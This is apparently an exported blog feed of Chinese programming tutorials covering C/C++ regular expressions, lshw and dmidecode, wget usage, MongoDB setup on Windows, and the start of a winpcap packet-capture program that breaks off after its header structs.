    <content type="text"><![CDATA[最近接触了C++的正则表达式,感觉还可以,以此来记录下过程 正文关于C++的正则表达式头文件,可以参考这个网站的教程http://www.cplusplus.com/reference/regex/ C正则表达式头文件regex.hhttp://pubs.opengroup.org/onlinepubs/7908799/xsh/regex.h.html 代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138#include &lt;iostream&gt;#include &lt;regex.h&gt;#include &lt;regex&gt;#include &lt;sys/types.h&gt;#include &lt;string.h&gt;#include &lt;string&gt;using namespace std;//c语言形式的正则表达式void cRegex()&#123; regex_t r; //成功返回0(REG_NOERROR) int ret=regcomp(&amp;r,"abc(.*?)-(.*?)xyz",REG_EXTENDED|REG_ICASE); if(ret==0)&#123; regmatch_t pm[10]; char src[]="abcQQQQQQ-5555555xyz"; ret=regexec(&amp;r,src,10,pm,0); if(ret!=REG_NOMATCH&amp;&amp;ret==REG_NOERROR)&#123; for (int i = 0; i &lt;sizeof(pm)/sizeof(regmatch_t); ++i) &#123; if(pm[i].rm_so==-1)&#123; break; &#125; //rm_so:匹配子字符串的开始 //rm_eo:匹配子字符串的结束 //rm_eo-rm_so:表示匹配的字符串的长度 //可参考:http://pubs.opengroup.org/onlinepubs/7908799/xsh/regex.h.html //cout&lt;&lt;pm[i].rm_so&lt;&lt;"\t"&lt;&lt;pm[i].rm_eo&lt;&lt;endl; int matchcount=pm[i].rm_eo-pm[i].rm_so; char matchvalue[20+1]; bzero(matchvalue,21); //从匹配到的子字符串索引拷贝内容 memcpy(matchvalue,src+pm[i].rm_so,matchcount); matchvalue[strlen(matchvalue)]='\0'; printf("---&gt;%s\n",matchvalue); &#125; &#125;else&#123; char errmsg[250]=&#123;0&#125;; regerror(ret,&amp;r,errmsg,250); cout&lt;&lt;"Message:"&lt;&lt;errmsg&lt;&lt;endl; &#125; //释放内存 regfree(&amp;r); &#125;&#125;//c++语言正则表达式替换void cppRegex_replace()&#123; string tx="https://www.baidu.com"; cout&lt;&lt;"old text:"&lt;&lt;tx.c_str()&lt;&lt;endl; //替换 try &#123; regex re("\\bbaidu\\b"); tx=regex_replace(tx,re,"google"); cout&lt;&lt;"new text:"&lt;&lt;tx.c_str()&lt;&lt;endl; &#125;catch (regex_error &amp;e)&#123; if(e.code()==regex_constants::error_badrepeat)&#123; //do something... &#125; cout&lt;&lt;"code:"&lt;&lt;e.code()&lt;&lt;endl &lt;&lt;"msg:"&lt;&lt;e.what()&lt;&lt;endl; &#125;&#125;//c++语言形式的正则表达式void cppRegex()&#123; /** *检测是否为正确的邮箱格式*/ string pattern="^\\w&#123;2,20&#125;@\\w&#123;2,&#125;.com$"; string text="josephxrays@qq.com"; regex re(pattern, std::regex_constants::icase| std::regex_constants::extended| regex_constants::ECMAScript); match_results&lt;string::const_iterator&gt; res; //smatch res; bool is=regex_match(text,res,re); //is=regex_search(text,res,re); if(is==true)&#123; printf("ok ,this is a true email format :)\n"); &#125;else&#123; printf("error email format :(\n"); &#125;&#125;//c++语言形式的正则表达式2void cppRegex_matchGroup()&#123; /** *检测是否为正确的邮箱格式*/ string pattern="(.*?)@(.*?)\\.(.*?)"; string text="josephxrays@163.com"; regex re(pattern, std::regex_constants::icase|//忽略大小写 std::regex_constants::extended| regex_constants::ECMAScript); match_results&lt;string::const_iterator&gt; res; //smatch res; try &#123; //bool is=regex_search(text,res,re); bool is=regex_match(text,res,re); if(is==true)&#123; printf("ok :)\n"); for (int i = 0; i &lt; res.size(); i++) &#123; printf("--&gt;%s \n",res.str(i).c_str()); &#125; &#125;else&#123; printf("no match :(\n"); &#125; &#125;catch (regex_error &amp;e)&#123; printf("exception:( \n \t %d \t %s\n",e.code(),e.what()); &#125;&#125;//c++语言形式的正则表达式3void cppRegex_matchGroup_iterator()&#123; string pattern="&lt;a href=\"(.*?)\"&gt;(.*?)&lt;/a&gt;"; string text= "&lt;a href=\"https://www.baidu.com\"&gt;百度&lt;/a&gt;"\ "&lt;a href=\"https://www.google.com\"&gt;谷歌&lt;/a&gt;"\ "&lt;a href=\"http://www.csdn.net\"&gt;CSDN&lt;/a&gt;"; regex re(pattern, std::regex_constants::icase| std::regex_constants::extended| regex_constants::ECMAScript); //regex_iterator 匹配所有子串 sregex_iterator its(text.begin(),text.end(),re); sregex_iterator ends; while (its!=ends)&#123; //match_results&lt;T&gt; //printf("%s \n",its-&gt;str(0).c_str()); printf("--&gt;%s \t",its-&gt;str(1).c_str()); printf("%s \n",its-&gt;str(2).c_str()); its++; &#125;&#125;int main()&#123; cRegex(); cppRegex(); cppRegex_matchGroup(); cppRegex_replace(); cppRegex_matchGroup_iterator(); return 0;&#125; 编译运行: g++ main.cpp -o regex_test &amp;&amp; ./regex_test 输出结果: 1234567891011121314---&gt;abcQQQQQQ-5555555xyz---&gt;QQQQQQ---&gt;5555555ok ,this is a truly email format :)ok :)--&gt;josephxrays@163.com --&gt;josephxrays --&gt;163 --&gt;com old text:https://www.baidu.comnew text:https://www.google.com--&gt;https://www.baidu.com 百度 --&gt;https://www.google.com 谷歌 --&gt;http://www.csdn.net CSDN bye~]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux lshw和dmidecode查看硬件信息]]></title>
    <url>%2Flinux-lshw-dmidecode%2F</url>
    <content type="text"><![CDATA[Dmidecode和lshw这两个工具可以查看Linux下有关硬件信息,这些信息包括 BIOS、系统、主板、处理器、内存、缓存等等 DmidecodeLINUX下直接安装 apt-get install dmidecode输入 dmidecode –help 查看帮助 Usage: dmidecode [OPTIONS]Options are:-d, –dev-mem FILE Read memory from device FILE (default: /dev/mem)-h, –help Display this help text and exit-q, –quiet Less verbose output-s, –string KEYWORD Only display the value of the given DMI string-t, –type TYPE Only display the entries of given type-u, –dump Do not decode the entries–dump-bin FILE Dump the DMI data to a binary file–from-dump FILE Read the DMI data from a binary file–no-sysfs Do not attempt to read DMI data from sysfs files–oem-string N Only display the value of the given OEM string-V, –version Display the version and exit 0 BIOS1 System2 Base Board3 Chassis4 Processor5 Memory Controller6 Memory Module7 Cache8 Port Connector9 System Slots10 On Board Devices11 OEM Strings12 System Configuration Options13 BIOS Language14 Group Associations15 System Event Log16 Physical Memory Array17 Memory Device18 32-bit Memory Error19 Memory Array Mapped Address20 Memory Device Mapped Address21 Built-in Pointing Device22 Portable Battery23 System Reset24 Hardware Security25 System Power Controls26 Voltage Probe27 Cooling Device28 Temperature Probe29 Electrical Current Probe30 Out-of-band Remote Access31 Boot Integrity Services32 System Boot33 64-bit Memory Error34 Management Device35 Management Device Component36 Management Device Threshold Data37 Memory Channel38 IPMI Device39 Power Supply40 Additional Information41 Onboard Device 1.输入 dmidecode -t 列出关键字 dmidecode: option requires an argument – ‘t’Type number or keyword expectedValid type keywords are: biossystembaseboardchassisprocessormemorycacheconnectorslot 然后在 dmidecode -t system 或 dmidecode -t 1 输出 # dmidecode 3.1Getting SMBIOS data from sysfs.SMBIOS 2.7 present. Handle 0x0001, DMI type 1, 27 bytesSystem InformationManufacturer: LENOVOProduct Name: 33661R8Version: ThinkPad Edge E530cSerial Number: MP43X9V…… 2.dmidecode -s dmidecode: option requires an argument – ‘s’String keyword expectedValid string keywords are:bios-vendorbios-versionbios-release-datesystem-manufacturersystem-product-namesystem-versionsystem-serial-numbersystem-uuidbaseboard-manufacturerbaseboard-product-namebaseboard-versionbaseboard-serial-numberbaseboard-asset-tagchassis-manufacturerchassis-typechassis-versionchassis-serial-numberchassis-asset-tagprocessor-familyprocessor-manufacturerprocessor-versionprocessor-frequency dmidecode -s system-version 输出 ThinkPad Edge E530c lshw(Hardware Lister)安装:apt-get install lshwlshw 比较简单 lshw –help Hardware Lister (lshw) - unknownusage: lshw [-format] [-options …]lshw -version -version print program version (unknown)format can be-html output hardware tree as HTML-xml output hardware tree as XML-short output hardware paths-businfo output bus information-X use graphical interface options can be-class CLASS only show a certain class of hardware-C CLASS same as ‘-class CLASS’-c CLASS same as ‘-class CLASS’-disable TEST disable a test (like pci, isapnp, cpuid, etc. )-enable TEST enable a test (like pci, isapnp, cpuid, etc. )-quiet don’t display status-sanitize sanitize output (remove sensitive information like serial numbers, etc.)-numeric output numeric IDs (for PCI, USB, etc.)-notime exclude volatile attributes (timestamps) from output 1.把信息保存为HTML/XML格式文本 lshw -html &gt; my.htmllshw -xml &gt; my.html 2.显示设备列表，输出包括设备路径(path)、类别(class)以及简单描述 lshw -short H/W path Device Class Description…… 3.显示指定类别的设备 lshw -C xxxx,其中 xxxx 就是 lshw -short 中的 Class 字段.如 lshw -C disk *-diskdescription: ATA Diskproduct: WDC WD5000LPVT-0vendor: Western Digital……*-cdrom…… 例如: lshw -C system|grep version 输出 version: ThinkPad Edge E530c]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Wget下载工具]]></title>
    <url>%2Fwget-tool%2F</url>
    <content type="text"><![CDATA[作为一款Linux下著名的文件下载工具–Wget,它的轻巧便捷及强大的功能可以与大多数下载工具相媲美.支持 HTTP,HTTPS,FTP协议, 也可以使用代理,断点续传… 正文英文帮助文档 但由于其是在命令行下操作,所以玩一起来还是有一定难度的.与 curl (由libcurl库实现)相比两者还是有一定的区别的. Linux下可以 wget --help 查看wget帮助,更详细的可以 man wget 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169启动： -V, --version 显示 Wget 的版本信息并退出 -h, --help 打印此帮助 -b, --background 启动后转入后台 -e, --execute=命令 运行一个“.wgetrc”风格的命令日志和输入文件： -o, --output-file=文件 将日志信息写入 FILE -a, --append-output=文件 将信息添加至 FILE -d, --debug 打印大量调试信息 -q, --quiet 安静模式 (无信息输出) -v, --verbose 详尽的输出 (此为默认值) -nv, --no-verbose 关闭详尽输出，但不进入安静模式 --report-speed=类型 以 &lt;类型&gt; 报告带宽。类型可以是 bits -i, --input-file=文件 下载本地或外部 &lt;文件&gt; 中的 URL -F, --force-html 把输入文件当成 HTML 文件 -B, --base=URL 解析相对于 URL 的 HTML 输入文件链接 (-i -F) --config=文件 指定要使用的配置文件 --no-cookies 不读取任何配置文件 --rejected-log=文件 将拒绝 URL 的原因写入 &lt;文件&gt;。下载： -t, --tries=数字 设置重试次数为 &lt;数字&gt; (0 代表无限制) --retry-connrefused 即使拒绝连接也是重试 -O, --output-document=文件 将文档写入 FILE -nc, --no-clobber 不要下载已存在将被覆盖的文件 --no-netrc don&apos;t try to obtain credentials from .netrc -c, --continue 断点续传下载文件 --start-pos=偏移量 从由零计数的 &lt;偏移量&gt; 开始下载 --progress=类型 选择进度条类型 --show-progress 在任意啰嗦状态下都显示进度条 -N, --timestamping 只获取比本地文件新的文件 --no-if-modified-since 不要在时间戳 (timestamping) 模式下使用 if-modified-since get 条件请求 --no-use-server-timestamps 不用服务器上的时间戳来设置本地文件 -S, --server-response 打印服务器响应 --spider 不下载任何文件 -T, --timeout=SECONDS 将所有超时设为 SECONDS 秒 --dns-timeout=SECS 设置 DNS 查寻超时为 SECS 秒 --connect-timeout=SECS 设置连接超时为 SECS 秒 --read-timeout=SECS 设置读取超时为 SECS 秒 -w, --wait=SECONDS 等待间隔为 SECONDS 秒 --waitretry=SECONDS 在获取文件的重试期间等待 1..SECONDS 秒 --random-wait 获取多个文件时，每次随机等待间隔 (0.5~1.5)*WAIT 秒 --no-proxy 禁止使用代理 -Q, --quota=数字 设置获取配额为 &lt;数字&gt; 字节 --bind-address=ADDRESS 绑定至本地主机上的 ADDRESS (主机名或是 IP) --limit-rate=RATE 限制下载速率为 RATE --no-dns-cache 关闭 DNS 查询缓存 --restrict-file-names=系统 限定文件名中的字符为 &lt;系统&gt; 允许的字符 --ignore-case 匹配文件/目录时忽略大小写 -4, --inet4-only 仅连接至 IPv4 地址 -6, --inet6-only 仅连接至 IPv6 地址 --prefer-family=地址族 首先连接至指定家族（IPv6，IPv4 或 none）的地址 --user=用户 将 ftp 和 http 的用户名均设置为 &lt;用户&gt; --password=密码 将 ftp 和 http 的密码均设置为 &lt;密码&gt; --ask-password 提示输入密码 --use-askpass=COMMAND specify credential handler for requesting username and password. If no COMMAND is specified the WGET_ASKPASS or the SSH_ASKPASS environment variable is used. --no-iri 关闭 IRI 支持 --local-encoding=ENC 使用 ENC 作为 IRI (国际化资源标识符) 的本地编码 --remote-encoding=ENC 使用 ENC 作为默认远程编码 --unlink 覆盖前移除文件 --no-xattr 不要在文件的拓展属性中储存元数据目录： -nd, --no-directories 不创建目录 -x, --force-directories 强制创建目录 -nH, --no-host-directories 不要创建主 (host) 目录 --protocol-directories 在目录中使用协议名称 -P, --directory-prefix=前缀 保存文件到 &lt;前缀&gt;/.. --cut-dirs=数字 忽略远程目录中 &lt;数字&gt; 个目录层。HTTP 选项： --http-user=用户 设置 http 用户名为 &lt;用户&gt; --http-password=密码 设置 http 密码为 &lt;密码&gt; --no-cache 不使用服务器缓存的数据。 --default-page=NAME 改变默认页 (通常是“index.html”)。 -E, --adjust-extension 以合适的扩展名保存 HTML/CSS 文档 --ignore-length 忽略头部的‘Content-Length’区域 --header=字符串 在头部插入 &lt;字符串&gt; --compression=TYPE choose compression, one of auto, gzip and none --max-redirect 每页所允许的最大重定向 --proxy-user=用户 使用 &lt;用户&gt; 作为代理用户名 --proxy-password=密码 使用 &lt;密码&gt; 作为代理密码 --referer=URL 在 HTTP 请求头包含‘Referer: URL’ --save-headers 将 HTTP 头保存至文件。 -U, --user-agent=代理 标识自己为 &lt;代理&gt; 而不是 Wget/VERSION。 --no-http-keep-alive 禁用 HTTP keep-alive (持久连接)。 --no-cookies 不使用 cookies。 --load-cookies=文件 会话开始前从 &lt;文件&gt; 中载入 cookies。 --save-cookies=文件 会话结束后保存 cookies 至 FILE。 --keep-session-cookies 载入并保存会话 (非永久) cookies。 --post-data=字符串 使用 POST 方式；把 &lt;字串&gt;作为数据发送。 --post-file=文件 使用 POST 方式；发送 &lt;文件&gt; 内容。 --method=HTTP方法 在请求中使用指定的 &lt;HTTP 方法&gt;。 --post-data=字符串 把 &lt;字串&gt; 作为数据发送，必须设置 --method --post-file=文件 发送 &lt;文件&gt; 内容，必须设置 --method --content-disposition 当选择本地文件名时允许 Content-Disposition 头部 (实验中)。 --content-on-error 在服务器错误时输出接收到的内容 --auth-no-challenge 不先等待服务器询问就发送基本 HTTP 验证信息。HTTPS (SSL/TLS) 选项： --secure-protocol=PR choose secure protocol, one of auto, SSLv2, SSLv3, TLSv1, TLSv1_1, TLSv1_2 and PFS --https-only 只跟随安全的 HTTPS 链接 --no-check-certificate 不要验证服务器的证书。 --certificate=文件 客户端证书文件。 --certificate-type=类型 客户端证书类型，PEM 或 DER。 --private-key=文件 私钥文件。 --private-key-type=类型 私钥文件类型，PEM 或 DER。 --ca-certificate=文件 带有一组 CA 证书的文件。 --ca-directory=DIR 保存 CA 证书的哈希列表的目录。 --ca-certificate=文件 带有一组 CA 证书的文件。 --pinnedpubkey=文件/散列值 用于验证节点的公钥（PEM/DER）文件或 任何数量的 sha256 散列值，以 base64 编码、 “sha256//” 开头、用“;”间隔HSTS 选项： --no-hsts 禁用 HSTS --hsts-file HSTS 数据库路径（将覆盖默认值）FTP 选项： --ftp-user=用户 设置 ftp 用户名为 &lt;用户&gt;。 --ftp-password=密码 设置 ftp 密码为 &lt;密码&gt; --no-remove-listing 不要删除‘.listing’文件 --no-glob 不在 FTP 文件名中使用通配符展开 --no-passive-ftp 禁用“passive”传输模式 --preserve-permissions 保留远程文件的权限 --retr-symlinks 递归目录时，获取链接的文件 (而非目录)FTPS 选项： --ftps-implicit 使用隐式 FTPS（默认端口 990） --ftps-resume-ssl 打开数据连接时继续控制连接中的 SSL/TLS 会话 --ftps-clear-data-connection 只加密控制信道；数据传输使用明文 --ftps-fallback-to-ftp 回落到 FTP，如果目标服务器不支持 FTPSWARC 选项： --warc-file=文件名 在一个 .warc.gz 文件里保持请求/响应数据 --warc-header=字符串 在头部插入 &lt;字符串&gt; --warc-max-size=数字 将 WARC 的最大尺寸设置为 &lt;数字&gt; --warc-cdx 写入 CDX 索引文件 --warc-dedup=文件名 不要记录列在此 CDX 文件内的记录 --no-warc-compression 不要 GZIP 压缩 WARC 文件 --no-warc-digests 不要计算 SHA1 摘要 --no-warc-keep-log 不要在 WARC 记录中存储日志文件 --warc-tempdir=目录 WARC 写入器的临时文件目录递归下载： -r, --recursive 指定递归下载 -l, --level=数字 最大递归深度 (inf 或 0 代表无限制，即全部下载)。 --delete-after 下载完成后删除本地文件 -k, --convert-links 让下载得到的 HTML 或 CSS 中的链接指向本地文件 --convert-file-only 只转换 URL 的文件部分（一般叫做“基础名”/basename） --backups=N 写入文件 X 前，轮换移动最多 N 个备份文件 -K, --backup-converted 在转换文件 X 前先将它备份为 X.orig。 -m, --mirror -N -r -l inf --no-remove-listing 的缩写形式。 -p, --page-requisites 下载所有用于显示 HTML 页面的图片之类的元素。 --strict-comments 用严格方式 (SGML) 处理 HTML 注释。递归接受/拒绝： -A, --accept=列表 逗号分隔的可接受的扩展名列表 -R, --reject=列表 逗号分隔的要拒绝的扩展名列表 --accept-regex=REGEX 匹配接受的 URL 的正则表达式 --reject-regex=REGEX 匹配拒绝的 URL 的正则表达式 --regex-type=类型 正则类型 (posix|pcre) -D, --domains=列表 逗号分隔的可接受的域名列表 --exclude-domains=列表 逗号分隔的要拒绝的域名列表 --follow-ftp 跟踪 HTML 文档中的 FTP 链接 --follow-tags=列表 逗号分隔的跟踪的 HTML 标识列表 --ignore-tags=列表 逗号分隔的忽略的 HTML 标识列表 -H, --span-hosts 递归时转向外部主机 -L, --relative 仅跟踪相对链接 -I, --include-directories=列表 允许目录的列表 --trust-server-names 使用重定向 URL 的最后一段作为本地文件名 -X, --exclude-directories=列表 排除目录的列表 -np, --no-parent 不追溯至父目录 如此多的参数,看着实在望而生畏,不过好在这是有中文的,所以…慢慢来 下面以实例来介绍该用具的主要用法 下载单个文件# wget https://ftp.gnu.org/gnu/wget/wget-1.19.tar.gz -P save_files -O wget.tar.gz –2018-01-06 17:22:48– https://ftp.gnu.org/gnu/wget/wget-1.19.tar.gz正在解析主机 ftp.gnu.org (ftp.gnu.org)… 208.118.235.20, 2001:4830:134:3::b正在连接 ftp.gnu.org (ftp.gnu.org)|208.118.235.20|:443… 已连接。已发出 HTTP 请求，正在等待回应… 200 OK长度：4202290 (4.0M) [application/x-gzip]正在保存至: “wget.tar.gz”6%[=&gt; ] 280.00K 21.8KB/s 剩余 3m 6s -O 指定输出文件的名字 -P 指定保存文件的目录 (未指定该参数默认保存在当前路径) 下载多个文件可以把要下载的多个链接地址保存到一个文件中,并在wget时指定 -i 参数 # wget -i files.txt 断点续传有时候在下载一个比较大的文件,碰到网络环境不好或者突然断网了,那么要重新下载这个文件了.为了避免这种情况发生,大多数下载软件都支持断点续传.顾名思义,就是在网络等问题的影响下而被中断下载后,等到网络恢复后,在原来的地方接着下载. wget也支持该功能,由参数 -c 指定# wget -c https://baidu.com -t 5 -t 指定重试次数 ,0 表示无限制 代理下载要下载一个国外的文件,有时运气不好(被墙),导致无法下载所需文件.这时就要使用代理了,而不是纠结该链接地址有问题. 说到代理,可以是本地搭建代理的服务器,也可以从网络上获得的公共服务器,这里以本地代理服务器为例.不过在此之前我已设置好了代理服务器,该服务器为: http://127.0.0.1:8087 # wget https://www.google.com -O output.html -e “use_proxy=on” -e “https_proxy=http://127.0.0.1:8087“ -e 运行一个“.wgetrc”风格的命令,wgetrc文件位于 /etc/wgetrc,为wget运行时的初始化文件.也可以在该文件里设置代理服务器地址(全局变量) use_proxy=on/no 使用/禁止代理,一般使用代理时,要指明该操作 http_proxy/https_proxy/ftp_proxy 3种协议的代理服务器,格式皆为: http://proxy.yoyodyne.com:18023 运行该命令输出如下 –2018-01-06 17:45:29– https://www.google.com/正在连接 127.0.0.1:8087… 已连接。错误: “www.google.com” 的证书不可信。错误: “www.google.com” 的证书颁发者未知。错误: “www.google.com” 的证书使用不安全的算法签名。 注意该处,我用的是 gae_proxy ,由于证书问题而出现该错误,解决方法两种 直接在原来命令行后加上 –no-check-certificate选项 ,表示不检查证书安全问题,忽略该过程.且错误变成了警告 指定证书,我的是 CA.crt 用到 –ca-certificate 选项,之后便可正常下载了.如: wget https://www.google.com -O output.html –progress=dot -e “use_proxy=on” -e “https_proxy=http://127.0.0.1:8087“ –ca-certificate=data/gae_proxy/CA.crt 限速下载# wget –limit-rate=10k https://ftp.gnu.org/gnu/wget/wget-1.18.tar.gz –limit-rate 指定要限制的大小 测试下载链接# wget –spider http://baidu.com 打开 Spider 模式。检查是否存在远程文件。–2018-01-06 18:13:16– http://baidu.com/正在解析主机 baidu.com (baidu.com)… 111.13.101.208, 123.125.114.144, 220.181.57.217正在连接 baidu.com (baidu.com)|111.13.101.208|:80… 已连接。已发出 HTTP 请求，正在等待回应… 200 OK长度：81 [text/html]存在远程文件且该文件可能含有更深层的链接，但不能进行递归操作 – 无法获取 通过 –spider参数,可以测试下载链接是否有效 最后一个例子: # wget –user-agent=”Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36” https://ftp.gnu.org/gnu/wget/wget-1.18.tar.xz -e “use_proxy=on” -e “http_proxy=http://127.0.0.1:8087“ -t 5 -P save_file –progress=dot 更多的参数还是要去查看帮助文档的… 结束bye~]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB数据库搭建(Windows)]]></title>
    <url>%2Fwin-mongodb%2F</url>
    <content type="text"><![CDATA[关于MongoD非关系数据库，网上有太多的解释，与其讲得再多，还不如亲自体验一下 MongoDB有用过MySQL，PostgreSQL，sqlite3等这些数据库的，是时候应该考虑下MongoDB了。。此处之外，MongoDB搭建也是非常简单的，本文以windows系统为例（问：为什么不是Linux？答：我想怎么玩就这么怎么玩！管得着？） 测试环境： Windows 10MongoDB 3.6.3 下载地址见官网 下载完成后是一个压缩文件，解压后bin目录下有如下文件 mongod.exe 数据库服务器进程（守护进程）mongo.exe 用于与服务器进行交互的shell控制台（JavaScript）mongoexport.exe 数据导出（备份）mongoimport.exe 数据导入（恢复） 进入CMD，cd 到mongoDB bin目录，通过 mongod.exe --help 可查看可执行文件的参数列表，参数还挺多的。。。 注意那一个参数 -f [ –config ] arg configuration file specifying additional options 可以指定一个配置文件作为服务器启动的参数比如以下几个参数： dbpath=C:\MongoDB\data\dblogpath=C:\MongoDB\logs\mongo.loglogappend=trueport=27017auth=truebind_ip_all=true dbpath 指定database目录，默认为 C:\data\db\logpath 指定日志文件，而不是标准输出到console。注意是文件，不是目录！logappend 指定以追加的模式写入日志文件，而不是覆盖port 指定服务器监听的端口，默认 27017auth 指定访问数据库时必须要经过身份验证bind_ip_all 绑定（监听）所有IP地址，或者 bind_ip 指定要绑定的IP地址列表，默认 localhost关于配置文件更详细信息还得去官网查查… MongoDB根目录下所有的文件，不存在的目录和文件自行创建 C:\MongoDB|–bin——-|– …|–conf——-|– mongo.conf|–data——-|– db|–logs——-|– mongo.log 之后在mongod.exe --config c:\MongoDB\conf\mongo.conf 接着我们输出 show dbs &gt;show dbs2018-02-21T10:29:48.852+0800 E QUERY [thread1] Error: listDatabases failed:{“ok” : 0,“errmsg” : “not authorized on admin to execute command { listDatabases: 1.0, $db: \”admin\” }”,“code” : 13,“codeName” : “Unauthorized”} :_getErrorWithCode@src/mongo/shell/utils.js:25:13Mongo.prototype.getDBs@src/mongo/shell/mongo.js:65:1shellHelper.show@src/mongo/shell/utils.js:816:19shellHelper@src/mongo/shell/utils.js:706:15@(shellhelp2):1:1&gt; 报错了，因为没有权限列举出所有的database，这就是之前的 auth 的作用。那么现在创建一个用户 &gt; use adminswitched to db admin&gt; db.createUser({user:’fuck’,pwd:’12345’,roles:[{role:’root’,db:’admin’}]}) Successfully added user: {“user” : “fuck”,“roles” : [{“role” : “root”,“db” : “admin”}]}&gt; 首先，切换到 admin 这个database，然后通过 db.createUser 来创建一个新的用户，这里创建一个root权限的用户 :)exit，重新进入 mongo console再次 show dbs，同样报错。接着 &gt;use admin&gt;db.auth(‘fuck’,’12345’)&gt;1&gt;show dbsadmin 0.000GBconfig 0.000GBlocal 0.000GB1 说明验证成功；0 验证失败 现在我们已经成功搭建的MongoDB服务器。。等等，那么我们下次开机还不是还要重新通过命令行来启动服务器？这样也太麻烦了吧。是的，所以可以把MongoDB添加到系统服务里面，让它开机自启动。 还记得 mongod.exe --help吗？我们可以找找有哪些参数有用得到的。。。 Windows服务控制管理 Windows Service Control Manager options:–install install Windows service–remove remove Windows service--reinstall reinstall Windows service (equivalentto –remove followed by –install)–serviceName arg Windows service name–serviceDisplayName arg Windows service display name–serviceDescription arg Windows service description–serviceUser arg account for service execution–servicePassword arg password used to authenticateserviceUser 那么，我们可以这样做，通过 –install 安装系统服务 mongod.exe –config c:\MongoDB\conf\mongo.conf –serviceName MongoDB –serviceDisplayName MongoDB_Server –serviceDescription “This is my MongoDB Server…” –install 看！是不是OK了，So easy!除此之外，我们还可以把 C:\MongoDB\bin 添加到PATH环境变量里。现在启动该服务或者 net start MongoDB，回到cmd，输入 mongo -u fuck -p 12345 admin -u 指定用户名称-p 指定用户密码后面的 admin 则是要登录的database 结尾嗯…很简单吧！除此之外，MongoDB数据库提供的编程接口也是支持大多数语言的，比如 C，C++，Java，Python，PHP……具体可从官网上查看使用方法。对于C/C++，似乎挺复杂的。]]></content>
      <categories>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用winpcap获取网络数据传输]]></title>
    <url>%2Fwinpcap-use%2F</url>
    <content type="text"><![CDATA[前言 winpcap(windows packet capture)是windows平台下一个免费，公共的网络访问系统。开发winpcap这个项目的目的在于为win32应用程序提供访问网络底层的能力。它用于windows系统下的直接的网络编程。 驱动功能捕获原始数据包，包括在共享网络上各主机发送/接收的以及相互之间交换的数据包；在数据包发往应用程序之前，按照自定义的规则将某些特殊的数据包过滤掉；在网络上发送原始的数据包；收集网络通信过程中的统计信息。 正文在使用之前，可以到winpcap官网下载安装 代码说明一切 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281#include &lt;iostream&gt;#define HAVE_REMOTE#include &lt;pcap.h&gt;#include &lt;windows.h&gt;#include &lt;WinSock2.h&gt;#pragma comment(lib,"ws2_32") using namespace std; /* packet handler 函数原型 */void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data); #define Ethernet_IPv4 0x0800#define Ethernet_ARP 0x0806 //Ethernet帧 size:14(Ethernet II)struct EthernetHeader&#123; BYTE byDestMac[6]; BYTE bySrcMac[6]; USHORT usType; &#125;; //TCP 头信息 size:20struct TCPHeader&#123; USHORT m_sSourPort; // 源端口号16bit USHORT m_sDestPort; // 目的端口号16bit ULONG m_uiSequNum;// 序列号32bit ULONG m_uiAcknowledgeNum; // 确认号32bit USHORT m_sHeaderLenAndFlag;// 前4位：TCP头长度；中6位：保留；后6位：标志位 USHORT m_sWindowSize;// 窗口大小16bit USHORT m_sCheckSum;// 检验和16bit USHORT m_surgentPointer;// 紧急数据偏移量16bit&#125;; //ARP 头信息struct ARPHeader&#123; USHORT usHardwareType;//Ethernet(1) USHORT ProtocolType;//IPv4(0x0800) BYTE byHardwareSize; BYTE byProtocolSize; BYTE byOpcode;//request(1) BYTE bySenderMAC[6]; DWORD dwSenderIPaddress; BYTE byTargetMAC[6]; DWORD dwTargetIPaddress;&#125;; /* 4字节的IP地址 */typedef struct _IPAddress&#123; u_char byte1; u_char byte2; u_char byte3; u_char byte4;&#125; IPAddress; /* IPv4 首部 */typedef struct _IPHeader&#123; BYTE m_byVerHLen; //4位版本+4位首部长度 BYTE m_byTOS; //服务类型 USHORT m_usTotalLen; //总长度 USHORT m_usID; //标识 USHORT m_usFlagFragOffset; //3位标志+13位片偏移 BYTE m_byTTL; //TTL BYTE m_byProtocol; //协议 USHORT m_usHChecksum; //首部检验和 DWORD m_ulSrcIP; //源IP地址 DWORD m_ulDestIP; //目的IP地址&#125;IPHeader; /* IPv4 首部 */typedef struct _IPHeader2&#123; BYTE m_byVerHLen; //4位版本+4位首部长度 BYTE m_byTOS; //服务类型 USHORT m_usTotalLen; //总长度 USHORT m_usID; //标识 USHORT m_usFlagFragOffset; //3位标志+13位片偏移 BYTE m_byTTL; //TTL BYTE m_byProtocol; //协议 USHORT m_usHChecksum; //首部检验和 IPAddress m_ulSrcIP; //源IP地址 IPAddress m_ulDestIP; //目的IP地址&#125;IPHeader2; /* UDP 首部*/typedef struct _UDPHeader&#123; USHORT src_port; // 源端口(Source port) USHORT dest_port; // 目的端口(Destination port) USHORT datalen; // UDP数据包长度(Datagram length) USHORT checksum; // 校验和(Checksum) &#125; UDPHeader; 